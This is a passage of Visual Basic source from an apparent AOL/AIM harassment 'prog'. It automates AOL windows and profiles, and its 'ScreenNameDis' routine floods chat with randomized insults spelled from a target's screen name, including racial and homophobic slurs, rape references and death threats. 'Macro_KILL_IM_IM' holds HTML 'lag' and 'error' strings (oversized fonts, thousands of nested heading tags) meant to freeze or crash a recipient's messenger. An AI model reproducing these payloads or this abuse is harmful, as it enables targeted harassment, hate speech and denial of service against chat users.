If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat (az + ("<b>T</b>ozed <i>" + Perzon$ + "</i> in [<i>" + sec.caption + "</i>] <b>s</b>econdz"))
Call ClicK_OK("America Online") 'clickz ok on da aol msg
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then TimeOut (0.5)
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then uZa$ = INI_GeT("Uzer", "current", (App.Path + "\uzer.ini"))
Call ClicK_OK("America Online")
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then TimeOut (0.5)
Call ClicK_OK("America Online")
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat (az + "<u>" + uZa$ + ("</u> <b>T</b>ermed [<i>" + t$ + "</i>] <b>p</b>Eepz wi<b>T</b> (<i>\/)</i>az<b>T</b>a <b>P</b>roGG!"))
Call ClicK_OK("America Online")
sec.caption = "0"

End If
End Sub

Function Tag_Profile(tmr As Timer, name As String, loc As String, bday As String, martial As String, line1 As String, line2 As String, line3 As String, line4 As String)
'ouwop

Call Tag_OpenMD(tmr)
'FreeProcess
SetIT:
TimeOut (0.4)
If TAG_FindEdit = 0 Then GoTo SetIT:
TimeOut (0.4)
'FreeProcess
Call TAG_Set(name, loc, bday, martial, line1, line2, line3, line4)
TimeOut (0.4)
'FreeProcess
Call TAG_ClozeMD(tmr)
TimeOut (0.4)
'FreeProcess
End Function
Sub TAG_ClozeMD(tmr As Timer)
'ouwop
Call TAG_CheckOK
mem& = FindChildByTitle(AolMdi, "Member Directory")
Call AOL4_KillWin(mem&)
'da tiemr which u called "TAG_KillReminder"
tmr.Enabled = False
End Sub
Sub Tag_OpenMD(tmr As Timer)
'ouwop
Call XAOL4_Keyword("profile")
tTt:
If TAG_FindEdit = 1 Then GoTo nex
TimeOut (0.9)
Do
DoEvents
TimeOut (0.001)
mem& = FindChildByTitle(AolMdi, "Member Directory")
ico% = FindChildByClass(mem&, "_AOL_ICON")
If TAG_FindEdit = 1 Then GoTo nex
Loop Until mem& <> 0
nex:
If gettext(ico%) = "My Profile" Then Call cLickiCoN(ico%) Else GoTo tTt
'in da timer put "TAG_KillReminder"
TimeOut (1)
tmr.Enabled = True
End Sub


Function Text_VeryCrazy(strin As String)
For X = 1 To Len(strin) Step 3
i$ = Mid(strin, X, 1)
i2$ = Mid(strin, X + 1, 1)
i3$ = Mid(strin, X + 2, 1)
final$ = final$ & "<B>" & i$ & "</B>" & i2$ & "<i>" & i3$ & "</i>"
Next X
Text_VeryCrazy = final$

End Function
Function Chat_TighT(strin As String)
'ouwop
For X = 1 To Len(strin) Step 3
   Dim Style, StyleOFF, style3, Style3OfF
    Randomize
    Style = Int(5 * Rnd + 1)
    StyleOFF = Int(5 * Rnd + 1)
If Style = 1 Then d$ = "<B>"
If Style = 2 Then d$ = "<i>"
If Style = 3 Then d$ = "<s>"
If Style = 4 Then d$ = "<u>"
If Style = 5 Then d$ = "<sup>"
If StyleOFF = 1 Then e$ = "</B>"
If StyleOFF = 2 Then e$ = "</i>"
If StyleOFF = 3 Then e$ = "</s>"
If StyleOFF = 4 Then e$ = "</u>"
If StyleOFF = 5 Then e$ = "</sup>"
If style3 = 1 Then f$ = "<B>"
If style3 = 2 Then f$ = "<i>"
If style3 = 3 Then f$ = "<s>"
If style3 = 4 Then f$ = "<u>"
If style3 = 5 Then f$ = "<sup>"
If Style3OfF = 1 Then g$ = "</B>"
If Style3OfF = 2 Then g$ = "</i>"
If Style3OfF = 3 Then g$ = "</s>"
If Style3OfF = 4 Then g$ = "</u>"
If Style3OfF = 5 Then g$ = "</sup>"
i$ = Mid(strin, X, 1)
i2$ = Mid(strin, X + 1, 1)
i3$ = Mid(strin, X + 2, 1)
'
final$ = final$ & d$ & e$ & f$ & i$ & g$ & d$ & f$ & d$ & i2$ & f$ & g$ & i3$ & f$ & g$
Next X
Chat_TighT = final$

End Function


Function ScreenNameDis(nAm As String)
''OUWOP
'made wen drunk >;c
'diz took me a long fucking time to figure out deez fucking phrazez
'and im extremely fuckin proud, 3 phrazez to eacch char Randomized >;]
'o ya remeber fuck all bitchez ,dey aint shyt
Dim a, b, c, d, e, f, g, h, i, J, k, l, m, n, o, p, q, r, s, t, u, v, w, XX, Y, z, one, tWo, three, four, five, six, seven, eight, nine, ten
sendchat ASCII_Random + (" <B>MazTa ProGG DizzinG: </b><i>" & nAm)
TimeOut (1)
For X = 1 To Len(nAm)
    Randomize
a = Int(3 * Rnd + 1)
b = Int(3 * Rnd + 1)
c = Int(3 * Rnd + 1)
d = Int(3 * Rnd + 1)
e = Int(3 * Rnd + 1)
f = Int(3 * Rnd + 1)
g = Int(3 * Rnd + 1)
h = Int(3 * Rnd + 1)
i = Int(3 * Rnd + 1)
J = Int(3 * Rnd + 1)
k = Int(3 * Rnd + 1)
l = Int(3 * Rnd + 1)
m = Int(3 * Rnd + 1)
n = Int(3 * Rnd + 1)
o = Int(3 * Rnd + 1)
p = Int(3 * Rnd + 1)
q = Int(3 * Rnd + 1)
r = Int(3 * Rnd + 1)
s = Int(3 * Rnd + 1)
t = Int(3 * Rnd + 1)
u = Int(3 * Rnd + 1)
v = Int(3 * Rnd + 1)
w = Int(3 * Rnd + 1)
XX = Int(3 * Rnd + 1)
Y = Int(3 * Rnd + 1)
z = Int(3 * Rnd + 1)
one = Int(3 * Rnd + 1)
tWo = Int(3 * Rnd + 1)
three = Int(3 * Rnd + 1)
four = Int(3 * Rnd + 1)
five = Int(3 * Rnd + 1)
six = Int(3 * Rnd + 1)
seven = Int(3 * Rnd + 1)
eight = Int(3 * Rnd + 1)
nine = Int(3 * Rnd + 1)
ten = Int(3 * Rnd + 1)
   
lcse$ = LCase(nAm)
letr$ = Mid(lcse$, X, 1)
If letr$ = "a" Then If a = 1 Then Let Dis$ = "•^v^•[<B>a</B>] -is for the <u>a</u>ss in your mouth": GoTo Dissem Else: If a = 2 Then Let Dis$ = "•^v^•[<B>a</B>] -is for the <u>a</u>ss in your face": GoTo Dissem Else: If a = 3 Then Let Dis$ = "•^v^•[<B>a</B>] -is for how <u>a</u>grivated im gittin": GoTo Dissem
If letr$ = "b" Then If b = 1 Then Let Dis$ = "•^v^•[<B>b</B>] -is for the <u>b</u>itch dat u are": GoTo Dissem Else: If b = 2 Then Let Dis$ = "•^v^•[<B>b</B>] -is for the <u>b</u>itch your mom iz": GoTo Dissem Else: If b = 3 Then Let Dis$ = "•^v^•[<B>b</B>] -is for the <u>b</u>ite mark on your dick": GoTo Dissem
If letr$ = "c" Then If c = 1 Then Let Dis$ = "•^v^•[<B>c</B>] -is for the <u>c</u>unt you are": GoTo Dissem Else: If c = 2 Then Let Dis$ = "•^v^•[<B>c</B>] -is for the <u>c</u>rack im a put in yo 4head": GoTo Dissem Else: If c = 3 Then Let Dis$ = "•^v^•[<B>c</B>] -is for the <u>c</u>ut on you neck im a put": GoTo Dissem
If letr$ = "d" Then If d = 1 Then Let Dis$ = "•^v^•[<B>d</B>] -is for all the times your <u>d</u>issed": GoTo Dissem Else: If d = 2 Then Let Dis$ = "•^v^•[<B>d</B>] -is for <u>d</u>ick in yo mouth": GoTo Dissem Else: If d = 3 Then Let Dis$ = "•^v^•[<B>d</B>] -is for the <u>d</u>irt on your azz": GoTo Dissem
If letr$ = "e" Then If e = 1 Then Let Dis$ = "•^v^•[<B>e</B>] -is for that <u>e</u>gghead of yours": GoTo Dissem Else: If e = 2 Then Let Dis$ = "•^v^•[<B>e</B>] -is for watch <u>e</u>very move i make": GoTo Dissem Else: If e = 3 Then Let Dis$ = "•^v^•[<B>e</B>] -is for your job Seven <u>E</u>leven": GoTo Dissem
If letr$ = "f" Then If f = 1 Then Let Dis$ = "•^v^•[<B>f</B>] -is for the <u>f</u>riday nights you stay home": GoTo Dissem Else: If f = 2 Then Let Dis$ = "•^v^•[<B>f</B>] -is for all da timez i <u>f</u>ucked your mom": GoTo Dissem Else: If f = 3 Then Let Dis$ = "•^v^•[<B>f</B>] -is for the people who <u>f</u>ucked u n lefT": GoTo Dissem
If letr$ = "g" Then If g = 1 Then Let Dis$ = "•^v^•[<B>g</B>] -is for the <u>g</u>irlz who whored you": GoTo Dissem Else: If g = 2 Then Let Dis$ = "•^v^•[<B>g</B>] -is for the <u>g</u>un on yo Dome": GoTo Dissem Else: If g = 3 Then Let Dis$ = "•^v^•[<B>g</B>] -is for the <u>g</u>round your gonna hit": GoTo Dissem
If letr$ = "h" Then If h = 1 Then Let Dis$ = "•^v^•[<B>h</B>] -is for the <u>h</u>o yo momma iz": GoTo Dissem Else: If h = 2 Then Let Dis$ = "•^v^•[<B>h</B>] -is for the <u>h</u>ead u neva got": GoTo Dissem Else: If h = 3 Then Let Dis$ = "•^v^•[<B>h</B>] -is for the <u>h</u>eefer u iz": GoTo Dissem
If letr$ = "i" Then If i = 1 Then Let Dis$ = "•^v^•[<B>i</B>] -is for the <u>i</u>diotic dumbass you are": GoTo Dissem Else: If i = 2 Then Let Dis$ = "•^v^•[<B>i</B>] -is for the <u>i</u>ce u cant afford": GoTo Dissem Else: If i = 3 Then Let Dis$ = "•^v^•[<B>i</B>] -is for the ""<u>i</u>s"" in these phrasez": GoTo Dissem
If letr$ = "j" Then If J = 1 Then Let Dis$ = "•^v^•[<B>j</B>] -is for all da timez u <u>j</u>erkoff": GoTo Dissem Else: If J = 2 Then Let Dis$ = "•^v^•[<B>j</B>] -is for your mom <u>J</u>udge Judy": GoTo Dissem Else: If J = 3 Then Let Dis$ = "•^v^•[<B>j</B>] -is for da <u>J</u>.D. dat u cant handle": GoTo Dissem
If letr$ = "k" Then If k = 1 Then Let Dis$ = "•^v^•[<B>k</B>] -is for da <u>k</u>id u really iz": GoTo Dissem Else: If k = 2 Then Let Dis$ = "•^v^•[<B>k</B>] -is for your group <u>k</u>kk": GoTo Dissem Else: If k = 3 Then Let Dis$ = "•^v^•[<B>k</B>] -is for da <u>k</u>idz u abbandoned": GoTo Dissem
If letr$ = "l" Then If l = 1 Then Let Dis$ = "•^v^•[<B>l</B>] -is for the <u>l</u>ame azz you are": GoTo Dissem Else: If l = 2 Then Let Dis$ = "•^v^•[<B>l</B>] -is for the <u>l</u>ard in your azz": GoTo Dissem Else: If l = 3 Then Let Dis$ = "•^v^•[<B>l</B>] -is for the Flash uv <u>l</u>ight youll see": GoTo Dissem Else:
If letr$ = "m" Then If m = 1 Then Let Dis$ = "•^v^•[<B>m</B>] -is for da <u>m</u>any men you sucked": GoTo Dissem Else: If m = 2 Then Let Dis$ = "•^v^•[<B>m</B>] -is for your favorite rapper: E<u>m</u>inem": GoTo Dissem Else: If m = 3 Then Let Dis$ = "•^v^•[<B>m</B>] -is for da Door<u>M</u>at you sleep on": GoTo Dissem
If letr$ = "n" Then If n = 1 Then Let Dis$ = "•^v^•[<B>n</B>] -is for da <u>n</u>igga datz gunna kill u, me!": GoTo Dissem Else: If n = 2 Then Let Dis$ = "•^v^•[<B>n</B>] -is for the <u>n</u>othing you know": GoTo Dissem Else: If n = 3 Then Let Dis$ = "•^v^•[<B>n</B>] -is for da <u>n</u>ightmarez youll have": GoTo Dissem
If letr$ = "o" Then If o = 1 Then Let Dis$ = "•^v^•[<B>o</B>] -is for the sex <u>O</u>peration you had": GoTo Dissem Else: If o = 2 Then Let Dis$ = "•^v^•[<B>o</B>] -is for <u>O</u>pposite Sex u Dont like": GoTo Dissem Else: If o = 3 Then Let Dis$ = "•^v^•[<B>o</B>] -is for the sex <u>O</u>aphy mom u have": GoTo Dissem
If letr$ = "p" Then If p = 1 Then Let Dis$ = "•^v^•[<B>p</B>] -is for the <u>p</u>uzzy u neva geT!": GoTo Dissem Else: If p = 2 Then Let Dis$ = "•^v^•[<B>p</B>] -is for the timez you <u>p</u>icked your noze!": GoTo Dissem Else: If p = 3 Then Let Dis$ = "•^v^•[<B>p</B>] -is for the <u>p</u>into youll own!": GoTo Dissem
If letr$ = "q" Then If q = 1 Then Let Dis$ = "•^v^•[<B>q</B>] -is for the <u>Q</u>ueer you are": GoTo Dissem Else: If q = 2 Then Let Dis$ = "•^v^•[<B>q</B>] -is for the <u>Q</u>ueen dat rulez you": GoTo Dissem Else: If q = 3 Then Let Dis$ = "•^v^•[<B>q</B>] -is for the <u>Q</u>uicknezz uv my 9MM": GoTo Dissem
If letr$ = "r" Then If r = 1 Then Let Dis$ = "•^v^•[<B>r</B>] -is for all the times i <u>R</u>aped your sizter": GoTo Dissem Else: If r = 2 Then Let Dis$ = "•^v^•[<B>r</B>] -is for da <u>R</u>ed shit around your dick": GoTo Dissem Else: If r = 3 Then Let Dis$ = "•^v^•[<B>r</B>] -is for da <u>R</u>ope i tied your mom up with": GoTo Dissem
If letr$ = "s" Then If s = 1 Then Let Dis$ = "•^v^•[<B>s</B>] -is for your lover <u>S</u>teve Case": GoTo Dissem Else: If s = 2 Then Let Dis$ = "•^v^•[<B>s</B>] -is for da <u>S</u>ucky your bitch givez me": GoTo Dissem Else: If s = 3 Then Let Dis$ = "•^v^•[<B>s</B>] -is for Where u Shop.. <u>S</u>ave-Alot": GoTo Dissem
If letr$ = "t" Then If t = 1 Then Let Dis$ = "•^v^•[<B>t</B>] -is for the <u>t</u>its youll never see": GoTo Dissem Else: If t = 2 Then Let Dis$ = "•^v^•[<B>t</B>] -is for the <u>t</u>atto im aleave on your dead body": GoTo Dissem Else: If t = 3 Then Let Dis$ = "•^v^•[<B>t</B>] -is for <u>t</u>ight azzhole you had": GoTo Dissem
If letr$ = "u" Then If u = 1 Then Let Dis$ = "•^v^•[<B>u</B>] -is for your dirty <u>U</u>nderwear on yo azz": GoTo Dissem Else: If u = 2 Then Let Dis$ = "•^v^•[<B>u</B>] -is for <u>U</u>nder da bridge where u live": GoTo Dissem Else: If u = 3 Then Let Dis$ = "•^v^•[<B>u</B>] -is for your <u>U</u>gggly azz!": GoTo Dissem
If letr$ = "v" Then If v = 1 Then Let Dis$ = "•^v^•[<B>v</B>] -is for the <u>V</u>ictories you'll never have": GoTo Dissem Else: If v = 2 Then Let Dis$ = "•^v^•[<B>v</B>] -is for the <u>V</u>itaminz u should take": GoTo Dissem Else: If v = 3 Then Let Dis$ = "•^v^•[<B>v</B>] -is for the <u>V</u>erman who had birth to you": GoTo Dissem
If letr$ = "w" Then If w = 1 Then Let Dis$ = "•^v^•[<B>w</B>] -is for the 400 pounds you <u>W</u>iegh":   GoTo Dissem Else: If w = 2 Then Let Dis$ = "•^v^•[<B>w</B>] -is for da <u>W</u>ight azz you are":   GoTo Dissem Else: If w = 3 Then Let Dis$ = "•^v^•[<B>w</B>] -is for the <u>W</u>ight youll never se on yo teef":   GoTo Dissem
If letr$ = "x" Then If X = 1 Then Let Dis$ = "•^v^•[<B>x</B>] -is for all the lamers who [x]'ed you online": GoTo Dissem Else:  If X = 2 Then Let Dis$ = "•^v^•[<B>x</B>] -is for <u>X</u>actly hoe many timez u fucked, ""0""": GoTo Dissem Else:  If X = 3 Then Let Dis$ = "•^v^•[<B>x</B>] -is for all the lamers who [x]'ed you online": GoTo Dissem
If letr$ = "y" Then If Y = 1 Then Let Dis$ = "•^v^•[<B>y</B>] -is for the <u>Y</u>ellow on yo teef": GoTo Dissem Else:  If Y = 2 Then Let Dis$ = "•^v^•[<B>y</B>] -is for the <u>Y</u>ear u lozt you Virginity, this 1": GoTo Dissem Else:  If Y = 3 Then Let Dis$ = "•^v^•[<B>y</B>] -is for the <u>Y</u>o youll neva be": GoTo Dissem
If letr$ = "z" Then If z = 1 Then Let Dis$ = "•^v^•[<B>z</B>] -is for <u>Z</u>ero which is what you are":   GoTo Dissem Else: If z = 2 Then Let Dis$ = "•^v^•[<B>z</B>] -is for How much money you have":   GoTo Dissem Else: If z = 3 Then Let Dis$ = "•^v^•[<B>z</B>] -is for <u>Z</u>ero which is what you are":   GoTo Dissem
If letr$ = " " Then Let Dis$ = "•^v^•[ ] -is for empty space in yo head": GoTo Dissem
If letr$ = "1" Then If one = 1 Then Let Dis$ = "•^v^•[<B>1</B>] -is for the amount of girls you'll ever get": GoTo Dissem Else:  If one = 2 Then Let Dis$ = "•^v^•[<B>1</B>] -is for da size uv your dick": GoTo Dissem Else:  If one = 3 Then Let Dis$ = "•^v^•[<B>1</B>] -is for the ammount uv muny u git a munt": GoTo Dissem
If letr$ = "2" Then If tWo = 1 Then Let Dis$ = "•^v^•[<B>2</B>] -is for the 2 dollars you make an hour": GoTo Dissem Else:  If tWo = 2 Then Let Dis$ = "•^v^•[<B>2</B>] -is for the 2 Dayz u got left on AOL": GoTo Dissem Else:  If tWo = 3 Then Let Dis$ = "•^v^•[<B>2</B>] -is for da 2 titz youll neva see": GoTo Dissem
If letr$ = "3" Then If three = 1 Then Let Dis$ = "•^v^•[<B>3</B>] -is for da timez i nutted in yo muva": GoTo Dissem Else: If three = 2 Then Let Dis$ = "•^v^•[<B>3</B>] -is for da timez you been in 5th grade": GoTo Dissem Else: If three = 3 Then Let Dis$ = "•^v^•[<B>3</B>] -is for da # uv dayz u wear da same shit": GoTo Dissem
If letr$ = "4" Then If four = 1 Then Let Dis$ = "•^v^•[<B>4</B>] -is for da size of yo dick":   GoTo Dissem Else:  If four = 2 Then Let Dis$ = "•^v^•[<B>4</B>] -is for da size of yo dick (hard)":   GoTo Dissem Else:  If four = 3 Then Let Dis$ = "•^v^•[<B>4</B>] -is how many ounces u git fucked up on":   GoTo Dissem
If letr$ = "5" Then If five = 1 Then Let Dis$ = "•^v^•[<B>5</B>] -is for da 500$ i jacked you for": GoTo Dissem Else:  If five = 2 Then Let Dis$ = "•^v^•[<B>5</B>] -is for da 500$ u make a year": GoTo Dissem Else:  If five = 3 Then Let Dis$ = "•^v^•[<B>5</B>] -is for how many timez im gonna stomp u in da 4hed": GoTo Dissem
If letr$ = "6" Then If six = 1 Then Let Dis$ = "•^v^•[<B>6</B>] -is for the yearz you been single": GoTo Dissem Else: If six = 2 Then Let Dis$ = "•^v^•[<B>6</B>] -is for 6 Pack u think iz coo": GoTo Dissem Else: If six = 3 Then Let Dis$ = "•^v^•[<B>6</B>] -is your favorite number": GoTo Dissem
If letr$ = "7" Then If seven = 1 Then Let Dis$ = "•^v^•[<B>7</B>] -is for the timez your bitch fucked me!": GoTo Dissem Else: If seven = 2 Then Let Dis$ = "•^v^•[<B>7</B>] -is for how many times you raped a kid!": GoTo Dissem Else: If seven = 3 Then Let Dis$ = "•^v^•[<B>7</B>] -is for the timez a kid raped you!": GoTo Dissem
If letr$ = "8" Then If eight = 1 Then Let Dis$ = "•^v^•[<B>8</B>] -is for how many people beat the hell outta you today": GoTo Dissem Else:  If eight = 2 Then Let Dis$ = "•^v^•[<B>8</B>] -is for how many people hate you": GoTo Dissem Else:  If eight = 3 Then Let Dis$ = "•^v^•[<B>8</B>] -is for how many secondz u lazt in bed": GoTo Dissem
If letr$ = "9" Then If nine = 1 Then Let Dis$ = "•^v^•[<B>9</B>] -is for how many dayz you got left on AOL": GoTo Dissem Else: If nine = 2 Then Let Dis$ = "•^v^•[<B>9</B>] -is the last thing your gonna see": GoTo Dissem Else: If nine = 3 Then Let Dis$ = "•^v^•[<B>9</B>] -is the # uv timez u have left to restart your comp": GoTo Dissem
If letr$ = "0" Then If ten = 1 Then Let Dis$ = "•^v^•[<B>0</B>] -is for the amount of girls you get": GoTo Dissem Else:  If ten = 2 Then Let Dis$ = "•^v^•[<B>0</B>] -is for what youll amount to": GoTo Dissem Else: If ten = 3 Then Let Dis$ = "•^v^•[<B>0</B>] -is for the ""0-10"" girl you have": GoTo Dissem

Dissem:
Call sendchat("</u></b></i></s>" + Dis$)

TimeOut (0.5)


Next X

End Function





Sub Macro_Ouwop_AIM_IM(sn$)
Call AIM_SendIM(sn$, "|\¯¯ (/\)¯¯ /|' /¯¯,¯¯\ |\¯¯¯-¯)")
TimeOut (1)
Call AIM_RespondA("\ \__/\__/ / |\____ /|' \|__|¯|°")
TimeOut (0.7)
Call AIM_RespondA("  \|_|/'\|_|/    \|___ |/°  |__|¯")
TimeOut (0.7)
Call AIM_RespondA("WHat iz I?")
TimeOut (0.7)
Call AIM_RespondA("|\¯¯ (/\)¯¯ /|' /¯¯,¯¯\ |\¯¯¯-¯)")
TimeOut (0.7)
Call AIM_RespondA("\ \__/\__/ / |\____ /|' \|__|¯|°")
TimeOut (0.7)
Call AIM_RespondA("  \|_|/'\|_|/    \|___ |/°  |__|¯")
TimeOut (0.7)
Call AIM_RespondA("I iz da BOMB! Yeah Yeah")


End Sub
Sub Macro_KILL_IM_IM(sn$)

jerk$ = "<BODY BGCOLOR=#fffffe></html><h1>8===jjjj=D</html><h1>8==jjjj==D</html><h1>8=jjjj===D</html><h1>8jjjj====D</html><h1>8=jjjj===D</html><h1>8==jjjj==D</html><h1>8===jjjj=D</html><h1>8====jjjjD</html><h1>8===jjjj=D</html><h1>8==jjjj==D</html><h1>8=jjjj===D</html><h1>8jjjj====D</html><h1>8=jjjj===D</html><h1>8==jjjj==D</html><h1>8===jjjj=D</html><h1>8====jjjjD</html><h1>8===jjjj=D</html><h1>8==jjjj==D</html><h1>8=jjjj===D</html><h1>8jjjj====D</html><h1>8=jjjj===D</html><<h1>8==jjjj==D</html><h1>8===jjjj=D</html><h1>8====jjjjD</html><h1>8===jjjj=D</html><h1>8==jjjj==D</html><h1>8=jjjj===D</html><h1>8jjjj====D~~~~~</html><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3>"
Erro$ = "<BODY BGCOLOR=#fffffe></P><P ALIGN=CENTER>Ouwopz MazTa ProgG <font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999><i><u><b>Error"
lag$ = "<BODY BGCOLOR=#fffffe><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1>"
Line$ = "<BODY BGCOLOR=#fffffe><s><u><b><p><h3><h3><h3><h3><h3><u><h3><h3><h3><h3><h3><h3><h3><h3><u><h3><h3><h3><h3><h3><h3><h3><h3><u><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><u><u><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><u><u><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><u><u><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><u><u><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3>"
dot$ = "<BODY BGCOLOR=#fffffe><h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>."
Color$ = "<BODY BGCOLOR=#fffffe><BODY BGCOLOR=#00ff00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#0sff00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ff0f><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ffff><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#0fff00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00fff0><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ffff><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#000f00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00fff0><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ff0f><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#f0fff0><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#f0f0f0><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ffff><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#fffff0><h3><h2><h3><h2><h3><h2>"
